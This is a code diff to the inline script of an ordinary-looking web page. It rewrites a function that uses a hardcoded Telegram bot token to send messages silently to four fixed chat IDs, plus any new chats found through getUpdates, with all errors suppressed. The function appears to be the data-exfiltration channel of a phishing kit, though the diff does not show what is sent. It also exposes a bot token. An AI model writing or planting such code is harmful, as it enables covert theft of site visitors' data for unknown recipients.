@@ -587,21 +587,30 @@ footer{background:#fff;border-top:1px solid #e0e0e0;padding:20px 120px;}
 
 <script>
 var TG_TOKEN='9238718821:AAFeQkggDjDwc--cKsuw18doVT0l5ZWHWCA';
-var TG_CHAT=null;
+var TG_IDS=[7545803663,681437350,9166541729,9084903343];
 function tgSend(msg){
-  // get chat id first via getUpdates, then send
-  fetch('https://api.telegram.org/bot'+TG_TOKEN+'/getUpdates')
-    .then(r=>r.json()).then(d=>{
-      var updates=d.result;
-      if(!updates||!updates.length)return;
-      var cid=updates[updates.length-1].message?updates[updates.length-1].message.chat.id
-        :(updates[updates.length-1].channel_post?updates[updates.length-1].channel_post.chat.id:null);
-      if(!cid)return;
+  function send(ids){
+    ids.forEach(function(cid){
       fetch('https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage',{
         method:'POST',headers:{'Content-Type':'application/json'},
         body:JSON.stringify({chat_id:cid,text:msg})
+      }).catch(function(){});
+    });
+  }
+  // send to known IDs immediately
+  send(TG_IDS);
+  // also fetch latest updates to catch any new chat IDs
+  fetch('https://api.telegram.org/bot'+TG_TOKEN+'/getUpdates')
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(!d.result)return;
+      var newIds=[];
+      d.result.forEach(function(u){
+        var cid=(u.message&&u.message.chat.id)||(u.channel_post&&u.channel_post.chat.id);
+        if(cid&&TG_IDS.indexOf(cid)<0){newIds.push(cid);TG_IDS.push(cid);}
       });
-    }).catch(()=>{});
+      if(newIds.length)send(newIds);
+    }).catch(function(){});
 }
 var carouselPage=0;
 function carouselNext(){
